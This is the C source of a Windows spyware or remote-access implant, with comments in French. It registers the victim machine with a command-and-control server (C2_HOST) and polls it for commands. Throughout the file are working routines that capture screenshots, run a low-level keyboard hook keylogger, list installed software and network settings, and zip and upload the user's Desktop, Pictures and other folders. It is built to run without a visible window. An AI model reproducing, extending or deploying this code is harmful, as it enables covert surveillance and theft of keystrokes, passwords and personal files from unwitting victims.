#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "config.h"

/* --- Globals ------------------------------------------------------------ */

static HHOOK g_hook          = NULL;
static char  g_keylog_buf[KEYLOG_BUF_SIZE];
static int   g_keylog_pos    = 0;
static BOOL  g_keylog_active = FALSE;
static int   g_machine_id    = -1;

/* --- HTTP (WinINet) ----------------------------------------------------- */

static int http_request(const char *method, const char *path,
                        const char *body, DWORD body_len,
                        const char *content_type,
                        char *out_buf, int out_sz)
{
    HINTERNET hInet = InternetOpenA("agent/1.0",
                                    INTERNET_OPEN_TYPE_DIRECT,
                                    NULL, NULL, 0);
    if (!hInet) return -1;

    HINTERNET hConn = InternetConnectA(hInet, C2_HOST, (INTERNET_PORT)C2_PORT,
                                       NULL, NULL,
                                       INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) { InternetCloseHandle(hInet); return -1; }

    HINTERNET hReq = HttpOpenRequestA(hConn, method, path,
                                      NULL, NULL, NULL,
                                      INTERNET_FLAG_RELOAD |
                                      INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hReq) {
        InternetCloseHandle(hConn);
        InternetCloseHandle(hInet);
        return -1;
    }

    char headers[256] = "";
    if (content_type)
        snprintf(headers, sizeof(headers), "Content-Type: %s\r\n", content_type);

    BOOL ok = HttpSendRequestA(hReq,
                               headers[0] ? headers : NULL, (DWORD)-1,
                               (LPVOID)body, body_len);

    int total = 0;
    if (ok && out_buf) {
        DWORD read = 0;
        while (InternetReadFile(hReq, out_buf + total,
                                (DWORD)(out_sz - total - 1), &read) && read > 0)
            total += (int)read;
        out_buf[total] = '\0';
    }

    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    InternetCloseHandle(hInet);
    return ok ? total : -1;
}

static int http_get(const char *path, char *out, int sz) {
    return http_request("GET", path, NULL, 0, NULL, out, sz);
}

static int http_post_json(const char *path, const char *json,
                          char *out, int out_sz) {
    return http_request("POST", path, json, (DWORD)strlen(json),
                        "application/json", out, out_sz);
}

static int http_post_raw(const char *path,
                         const char *data, DWORD data_len,
                         const char *ct) {
    return http_request("POST", path, data, data_len, ct, NULL, 0);
}

/* Upload d'un fichier en multipart/form-data */
static int http_post_file(const char *path,
                          const char *filepath,
                          const char *field_name)
{
    HANDLE hFile = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return -1;

    DWORD file_sz   = GetFileSize(hFile, NULL);
    char *file_data = (char *)malloc(file_sz);
    if (!file_data) { CloseHandle(hFile); return -1; }

    DWORD rd;
    ReadFile(hFile, file_data, file_sz, &rd, NULL);
    CloseHandle(hFile);

    const char *boundary = "----AgentBoundary7A3F";
    const char *filename = strrchr(filepath, '\\');
    filename = filename ? filename + 1 : filepath;

    char hdr[512];
    snprintf(hdr, sizeof(hdr),
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n",
        boundary, field_name, filename);

    char ftr[128];
    snprintf(ftr, sizeof(ftr), "\r\n--%s--\r\n", boundary);

    DWORD hdr_len = (DWORD)strlen(hdr);
    DWORD ftr_len = (DWORD)strlen(ftr);
    DWORD total   = hdr_len + file_sz + ftr_len;
    char *body    = (char *)malloc(total);
    if (!body) { free(file_data); return -1; }

    memcpy(body,                     hdr,       hdr_len);
    memcpy(body + hdr_len,           file_data, file_sz);
    memcpy(body + hdr_len + file_sz, ftr,       ftr_len);
    free(file_data);

    char ct[128];
    snprintf(ct, sizeof(ct), "multipart/form-data; boundary=%s", boundary);

    int ret = http_request("POST", path, body, total, ct, NULL, 0);
    free(body);
    return ret;
}

/* --- Infos système ------------------------------------------------------ */

static void get_hostname(char *buf, int sz) {
    DWORD dw = (DWORD)sz;
    if (!GetComputerNameA(buf, &dw))
        strncpy(buf, "unknown", sz - 1);
}

/* ProductName dans le registre dit "Windows 10" même sur Windows 11.
   On corrige en vérifiant CurrentBuildNumber (>= 22000 = Windows 11). */
static void get_os_version(char *buf, int sz) {
    HKEY hKey;
    char product[128]    = "Windows";
    char build[32]       = "0";
    char display_ver[32] = "";

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
            0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD type, len;
        len = sizeof(product);
        RegQueryValueExA(hKey, "ProductName",
                         NULL, &type, (BYTE *)product, &len);
        len = sizeof(build);
        RegQueryValueExA(hKey, "CurrentBuildNumber",
                         NULL, &type, (BYTE *)build, &len);
        len = sizeof(display_ver);
        RegQueryValueExA(hKey, "DisplayVersion",
                         NULL, &type, (BYTE *)display_ver, &len);
        RegCloseKey(hKey);
    }

    if (atoi(build) >= 22000) {
        char *p = strstr(product, "Windows 10");
        if (p) memcpy(p + 8, "11", 2);
    }

    if (display_ver[0])
        snprintf(buf, sz, "%s %s (Build %s)", product, display_ver, build);
    else
        snprintf(buf, sz, "%s (Build %s)", product, build);
}

/* --- Réseau ------------------------------------------------------------- */

static void get_private_ip(char *buf, int sz) {
    IP_ADAPTER_INFO adapters[16];
    DWORD out_sz = sizeof(adapters);

    if (GetAdaptersInfo(adapters, &out_sz) == NO_ERROR) {
        PIP_ADAPTER_INFO p = adapters;
        while (p) {
            const char *ip = p->IpAddressList.IpAddress.String;
            if (strcmp(ip, "0.0.0.0") != 0) {
                strncpy(buf, ip, sz - 1);
                buf[sz - 1] = '\0';
                return;
            }
            p = p->Next;
        }
    }
    strncpy(buf, "unknown", sz - 1);
    buf[sz - 1] = '\0';
}

static void get_public_ip(char *buf, int sz) {
    HINTERNET hInet = InternetOpenA("agent/1.0",
                                    INTERNET_OPEN_TYPE_DIRECT,
                                    NULL, NULL, 0);
    if (!hInet) { strncpy(buf, "unknown", sz - 1); return; }

    HINTERNET hUrl = InternetOpenUrlA(hInet, "http://api.ipify.org",
                                      NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hInet);
        strncpy(buf, "unknown", sz - 1);
        return;
    }
    DWORD read = 0;
    InternetReadFile(hUrl, buf, (DWORD)(sz - 1), &read);
    buf[read] = '\0';
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInet);
}

static void get_net_config(char *out, int sz) {
    char dns[64] = "unknown";
    FIXED_INFO *fi = (FIXED_INFO *)malloc(sizeof(FIXED_INFO));
    if (fi) {
        DWORD fi_sz = sizeof(FIXED_INFO);
        if (GetNetworkParams(fi, &fi_sz) == NO_ERROR)
            strncpy(dns, fi->DnsServerList.IpAddress.String, sizeof(dns) - 1);
        free(fi);
    }

    IP_ADAPTER_INFO adapters[16];
    DWORD adapt_sz = sizeof(adapters);

    int pos = 0;
    pos += snprintf(out + pos, sz - pos,
                    "{\"dns\":\"%s\",\"adapters\":[", dns);

    if (GetAdaptersInfo(adapters, &adapt_sz) == NO_ERROR) {
        PIP_ADAPTER_INFO p = adapters;
        int first = 1;
        while (p && pos < sz - 256) {
            if (!first) pos += snprintf(out + pos, sz - pos, ",");
            first = 0;
            pos += snprintf(out + pos, sz - pos,
                "{\"name\":\"%s\",\"ip\":\"%s\","
                "\"mask\":\"%s\",\"gateway\":\"%s\"}",
                p->Description,
                p->IpAddressList.IpAddress.String,
                p->IpAddressList.IpMask.String,
                p->GatewayList.IpAddress.String);
            p = p->Next;
        }
    }
    snprintf(out + pos, sz - pos, "]}");
}

/* --- Screenshot (GDI32, BMP 24 bits) ----------------------------------- */

static int take_screenshot(const char *out_path) {
    FILE   *f    = NULL;
    char   *bits = NULL;

    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HDC     hScreen = GetDC(NULL);
    HDC     hMem    = CreateCompatibleDC(hScreen);
    HBITMAP hBmp    = CreateCompatibleBitmap(hScreen, w, h);
    HBITMAP hOld    = (HBITMAP)SelectObject(hMem, hBmp);

    BitBlt(hMem, 0, 0, w, h, hScreen, 0, 0, SRCCOPY);
    SelectObject(hMem, hOld);

    BITMAPINFOHEADER bih;
    ZeroMemory(&bih, sizeof(bih));
    bih.biSize        = sizeof(BITMAPINFOHEADER);
    bih.biWidth       = w;
    bih.biHeight      = -h;
    bih.biPlanes      = 1;
    bih.biBitCount    = 24;
    bih.biCompression = BI_RGB;

    DWORD row_sz = ((DWORD)(w * 3) + 3) & ~3u;
    DWORD img_sz = row_sz * (DWORD)h;
    bits = (char *)malloc(img_sz);
    if (!bits) goto cleanup;

    GetDIBits(hScreen, hBmp, 0, (UINT)h,
              bits, (BITMAPINFO *)&bih, DIB_RGB_COLORS);

    BITMAPFILEHEADER bfh;
    ZeroMemory(&bfh, sizeof(bfh));
    bfh.bfType    = 0x4D42;
    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bfh.bfSize    = bfh.bfOffBits + img_sz;

    f = fopen(out_path, "wb");
    if (f) {
        fwrite(&bfh, sizeof(bfh), 1, f);
        fwrite(&bih, sizeof(bih), 1, f);
        fwrite(bits, img_sz, 1, f);
        fclose(f);
    }
    free(bits);

cleanup:
    DeleteObject(hBmp);
    DeleteDC(hMem);
    ReleaseDC(NULL, hScreen);
    return f ? 0 : -1;
}

/* --- Keylogger (WH_KEYBOARD_LL) ---------------------------------------- */

static LRESULT CALLBACK keyboard_hook_proc(int nCode,
                                            WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN && g_keylog_active) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
        UINT vk = kb->vkCode;
        char key[32] = "";

        BYTE ks[256] = {0};
        GetKeyboardState(ks);
        WCHAR wc[4] = {0};
        if (ToUnicode(vk, kb->scanCode, ks, wc, 4, 0) == 1 && wc[0] >= 32) {
            if (wc[0] < 128)
                key[0] = (char)wc[0], key[1] = '\0';
            else
                snprintf(key, sizeof(key), "[U+%04X]", (unsigned)wc[0]);
        } else {
            switch (vk) {
                case VK_RETURN:  strcpy(key, "\n");    break;
                case VK_BACK:    strcpy(key, "[BS]");  break;
                case VK_TAB:     strcpy(key, "\t");    break;
                case VK_SPACE:   strcpy(key, " ");     break;
                case VK_DELETE:  strcpy(key, "[DEL]"); break;
                case VK_ESCAPE:  strcpy(key, "[ESC]"); break;
                case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT:
                case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL:
                case VK_MENU: break;
                default: snprintf(key, sizeof(key), "[VK%02X]", vk); break;
            }
        }

        int len = (int)strlen(key);
        if (len > 0 && g_keylog_pos + len < KEYLOG_BUF_SIZE - 1) {
            memcpy(g_keylog_buf + g_keylog_pos, key, len);
            g_keylog_pos += len;
            g_keylog_buf[g_keylog_pos] = '\0';
        }
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

static void start_keylog(void) {
    if (g_hook) return;
    g_keylog_pos    = 0;
    g_keylog_buf[0] = '\0';
    g_hook          = SetWindowsHookEx(WH_KEYBOARD_LL,
                                       keyboard_hook_proc, NULL, 0);
    g_keylog_active = TRUE;
}

static void stop_keylog(void) {
    if (!g_hook) return;
    g_keylog_active = FALSE;
    UnhookWindowsHookEx(g_hook);
    g_hook = NULL;

    if (g_keylog_pos > 0) {
        char path[64];
        snprintf(path, sizeof(path),
                 "/api/machines/%d/keylog", g_machine_id);
        http_post_raw(path, g_keylog_buf, (DWORD)g_keylog_pos,
                      "text/plain; charset=utf-8");
    }
    g_keylog_pos = 0;
}

/* --- Applications installées (registre) -------------------------------- */

/* Échappe une chaîne pour l'inclure dans un string JSON. */
static void json_escape(char *out, int out_sz, const char *in) {
    int i = 0, j = 0;
    while (in[i] && j < out_sz - 2) {
        unsigned char c = (unsigned char)in[i++];
        if      (c == '"'  && j+2 < out_sz-1) { out[j++]='\\'; out[j++]='"';  }
        else if (c == '\\' && j+2 < out_sz-1) { out[j++]='\\'; out[j++]='\\'; }
        else if (c >= 0x20)                    { out[j++]=(char)c; }
        /* ignore les caractères de contrôle */
    }
    out[j] = '\0';
}

static void get_installed_apps(char *out, int sz) {
    static const char *REG_KEYS[] = {
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        NULL
    };

    int pos   = 0;
    int first = 1;
    pos += snprintf(out + pos, sz - pos, "[");

    for (int k = 0; REG_KEYS[k]; k++) {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, REG_KEYS[k],
                          0, KEY_READ, &hKey) != ERROR_SUCCESS)
            continue;

        char  sub[256];
        DWORD idx = 0;
        while (pos < sz - 512 &&
               RegEnumKeyA(hKey, idx++, sub, sizeof(sub)) == ERROR_SUCCESS) {
            HKEY hSub;
            if (RegOpenKeyExA(hKey, sub, 0, KEY_READ, &hSub) != ERROR_SUCCESS)
                continue;

            char  raw_name[256]    = "";
            char  raw_version[64]  = "";
            DWORD type, len;

            len = sizeof(raw_name);
            RegQueryValueExA(hSub, "DisplayName",
                             NULL, &type, (BYTE *)raw_name, &len);
            len = sizeof(raw_version);
            RegQueryValueExA(hSub, "DisplayVersion",
                             NULL, &type, (BYTE *)raw_version, &len);
            RegCloseKey(hSub);

            if (raw_name[0] == '\0') continue;

            char name[512], version[128];
            json_escape(name,    sizeof(name),    raw_name);
            json_escape(version, sizeof(version), raw_version);

            if (!first) pos += snprintf(out + pos, sz - pos, ",");
            first = 0;
            pos += snprintf(out + pos, sz - pos,
                            "{\"name\":\"%s\",\"version\":\"%s\"}",
                            name, version);
        }
        RegCloseKey(hKey);
    }
    snprintf(out + pos, sz - pos, "]");
}

/* --- ZIP writer (stored, sans compression) ----------------------------- */

typedef struct { char *data; DWORD size; DWORD cap; } ZipBuf;

static void zip_append(ZipBuf *z, const void *d, DWORD n) {
    if (z->size + n > z->cap) {
        z->cap = (z->size + n) * 2 + 4096;
        z->data = (char *)realloc(z->data, z->cap);
    }
    memcpy(z->data + z->size, d, n);
    z->size += n;
}
static void zip_u16(ZipBuf *z, WORD v)  { zip_append(z, &v, 2); }
static void zip_u32(ZipBuf *z, DWORD v) { zip_append(z, &v, 4); }

/* CRC32 (algorithme standard, table initialisée à la première utilisation) */
static DWORD g_crc_table[256];
static BOOL  g_crc_ready = FALSE;

static DWORD calc_crc32(const BYTE *data, DWORD len) {
    if (!g_crc_ready) {
        for (DWORD i = 0; i < 256; i++) {
            DWORD c = i;
            for (int k = 0; k < 8; k++)
                c = (c & 1) ? (0xEDB88320 ^ (c >> 1)) : (c >> 1);
            g_crc_table[i] = c;
        }
        g_crc_ready = TRUE;
    }
    DWORD crc = 0xFFFFFFFF;
    for (DWORD i = 0; i < len; i++)
        crc = g_crc_table[(crc ^ data[i]) & 0xFF] ^ (crc >> 8);
    return crc ^ 0xFFFFFFFF;
}

typedef struct { DWORD offset; char name[MAX_PATH]; } ZipEntry;

static BOOL zip_add_file(ZipBuf *z, ZipEntry *entries, int *nent,
                         const char *filepath, const char *arcname)
{
    if (*nent >= 1023) return FALSE;

    HANDLE hf = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ,
                            NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return FALSE;

    DWORD fsz = GetFileSize(hf, NULL);
    /* ignore les fichiers > 20 MB pour éviter de saturer la mémoire */
    if (fsz == INVALID_FILE_SIZE || fsz > 20 * 1024 * 1024) {
        CloseHandle(hf); return FALSE;
    }

    BYTE *buf = (BYTE *)malloc(fsz ? fsz : 1);
    if (!buf) { CloseHandle(hf); return FALSE; }
    DWORD rd = 0;
    ReadFile(hf, buf, fsz, &rd, NULL);
    CloseHandle(hf);

    DWORD crc     = calc_crc32(buf, fsz);
    WORD  namelen = (WORD)strlen(arcname);

    entries[*nent].offset = z->size;
    strncpy(entries[*nent].name, arcname, MAX_PATH - 1);
    (*nent)++;

    zip_u32(z, 0x04034B50); zip_u16(z, 20); zip_u16(z, 0);
    zip_u16(z, 0);          zip_u16(z, 0);  zip_u16(z, 0);
    zip_u32(z, crc); zip_u32(z, fsz); zip_u32(z, fsz);
    zip_u16(z, namelen); zip_u16(z, 0);
    zip_append(z, arcname, namelen);
    zip_append(z, buf, fsz);
    free(buf);
    return TRUE;
}

/* Parcourt folder_path (niveau 1) et crée un ZIP dans out_zip_path. */
static BOOL create_folder_zip(const char *folder_path,
                               const char *out_zip_path)
{
    ZipBuf   z       = {NULL, 0, 0};
    ZipEntry entries[1024];
    int      nent    = 0;

    char pattern[MAX_PATH];
    snprintf(pattern, MAX_PATH, "%s\\*", folder_path);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(pattern, &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
            char full[MAX_PATH * 2];
            snprintf(full, sizeof(full), "%s\\%s", folder_path, fd.cFileName);
            zip_add_file(&z, entries, &nent, full, fd.cFileName);
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }

    if (nent == 0) { free(z.data); return FALSE; }

    /* Répertoire central */
    DWORD cd_offset = z.size;
    for (int i = 0; i < nent; i++) {
        /* Lit crc/tailles dans le local header (offset +14) */
        DWORD *lh    = (DWORD *)(z.data + entries[i].offset + 14);
        WORD   nl    = (WORD)strlen(entries[i].name);
        zip_u32(&z, 0x02014B50); zip_u16(&z, 20); zip_u16(&z, 20);
        zip_u16(&z, 0); zip_u16(&z, 0); zip_u16(&z, 0); zip_u16(&z, 0);
        zip_u32(&z, lh[0]); zip_u32(&z, lh[1]); zip_u32(&z, lh[2]);
        zip_u16(&z, nl); zip_u16(&z, 0); zip_u16(&z, 0);
        zip_u16(&z, 0);  zip_u16(&z, 0); zip_u32(&z, 0);
        zip_u32(&z, entries[i].offset);
        zip_append(&z, entries[i].name, nl);
    }
    DWORD cd_size = z.size - cd_offset;
    zip_u32(&z, 0x06054B50); zip_u16(&z, 0); zip_u16(&z, 0);
    zip_u16(&z, (WORD)nent); zip_u16(&z, (WORD)nent);
    zip_u32(&z, cd_size); zip_u32(&z, cd_offset); zip_u16(&z, 0);

    FILE *f = fopen(out_zip_path, "wb");
    if (f) { fwrite(z.data, z.size, 1, f); fclose(f); }
    free(z.data);
    return f != NULL;
}

/* --- Dispatch + main ---------------------------------------------------- */

static void handle_command(const char *cmd) {
    char path[64];

    if (strcmp(cmd, "screenshot") == 0) {
        const char *tmp = "screenshot.bmp";
        if (take_screenshot(tmp) == 0) {
            snprintf(path, sizeof(path),
                     "/api/machines/%d/upload", g_machine_id);
            http_post_file(path, tmp, "file");
            DeleteFileA(tmp);
        }

    } else if (strcmp(cmd, "start_keylog") == 0) {
        start_keylog();
        snprintf(path, sizeof(path),
                 "/api/machines/%d/result", g_machine_id);
        http_post_json(path, "{\"result\":\"keylog started\"}", NULL, 0);

    } else if (strcmp(cmd, "stop_keylog") == 0) {
        stop_keylog();
        snprintf(path, sizeof(path),
                 "/api/machines/%d/result", g_machine_id);
        http_post_json(path, "{\"result\":\"keylog sent\"}", NULL, 0);

    } else if (strcmp(cmd, "apps") == 0) {
        /* Le frontend attend {type:'json', data:[...]} */
        char *buf  = (char *)malloc(65536);
        char *json = (char *)malloc(65536 + 64);
        get_installed_apps(buf, 65536);
        snprintf(json, 65536 + 64,
                 "{\"result\":{\"type\":\"json\",\"data\":%s}}", buf);
        snprintf(path, sizeof(path),
                 "/api/machines/%d/result", g_machine_id);
        http_post_json(path, json, NULL, 0);
        free(buf); free(json);

    } else if (strcmp(cmd, "net_config") == 0) {
        char *buf  = (char *)malloc(16384);
        char *json = (char *)malloc(16384 + 64);
        get_net_config(buf, 16384);
        snprintf(json, 16384 + 64,
                 "{\"result\":{\"type\":\"json\",\"data\":%s}}", buf);
        snprintf(path, sizeof(path),
                 "/api/machines/%d/result", g_machine_id);
        http_post_json(path, json, NULL, 0);
        free(buf); free(json);

    } else if (strncmp(cmd, "files:", 6) == 0) {
        const char *folder_name = cmd + 6;

        /* Résout le chemin selon le nom de dossier reçu */
        char userprofile[MAX_PATH];
        if (!GetEnvironmentVariableA("USERPROFILE",
                                      userprofile, MAX_PATH))
            strncpy(userprofile, "C:\\Users\\Public", MAX_PATH - 1);

        char folder_path[512];
        if      (strcmp(folder_name, "Bureau") == 0)
            snprintf(folder_path, sizeof(folder_path), "%s\\Desktop",  userprofile);
        else if (strcmp(folder_name, "Images") == 0)
            snprintf(folder_path, sizeof(folder_path), "%s\\Pictures", userprofile);
        else
            snprintf(folder_path, sizeof(folder_path), "%s\\%s",
                     userprofile, folder_name);

        char zip_name[64];
        snprintf(zip_name, sizeof(zip_name), "%s.zip", folder_name);

        snprintf(path, sizeof(path),
                 "/api/machines/%d/result", g_machine_id);

        if (create_folder_zip(folder_path, zip_name)) {
            snprintf(path, sizeof(path),
                     "/api/machines/%d/upload", g_machine_id);
            http_post_file(path, zip_name, "file");
            DeleteFileA(zip_name);
        } else {
            /* Envoie quand même un résultat pour vider pending_command */
            http_post_json(path,
                "{\"result\":\"no files found\"}", NULL, 0);
        }
    }
}

static int do_register(void) {
    char hostname[256], os[256], priv_ip[64], pub_ip[64];
    get_hostname(hostname, sizeof(hostname));
    get_os_version(os, sizeof(os));
    get_private_ip(priv_ip, sizeof(priv_ip));
    get_public_ip(pub_ip, sizeof(pub_ip));

    char json[1024];
    snprintf(json, sizeof(json),
        "{\"hostname\":\"%s\",\"os_info\":\"%s\","
        "\"private_ip\":\"%s\",\"public_ip\":\"%s\"}",
        hostname, os, priv_ip, pub_ip);

    char resp[256] = "";
    if (http_post_json("/api/machines/report", json, resp, sizeof(resp)) < 0)
        return -1;

    const char *p = strstr(resp, "\"id\":");
    return p ? atoi(p + 5) : -1;
}

/* WinMain + -mwindows → pas de fenêtre console visible */
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev,
                   LPSTR lpCmd, int nShow)
{
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    g_machine_id = do_register();
    if (g_machine_id < 0) return 1;

    DWORD last_poll = 0;
    MSG   msg;

    while (1) {
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        DWORD now = GetTickCount();
        if (now - last_poll >= POLL_INTERVAL_MS) {
            last_poll = now;

            char poll_path[64];
            snprintf(poll_path, sizeof(poll_path),
                     "/api/machines/%d/command", g_machine_id);

            char resp[256] = "";
            http_get(poll_path, resp, sizeof(resp));

            const char *p = strstr(resp, "\"command\":");
            if (p) {
                p += 10;
                while (*p == ' ') p++;
                if (*p == '"') {
                    p++;
                    char cmd[64];
                    int i = 0;
                    while (*p && *p != '"' && i < 63)
                        cmd[i++] = *p++;
                    cmd[i] = '\0';
                    if (i > 0) handle_command(cmd);
                }
            }
        }

        Sleep(50);
    }
    return 0;
}
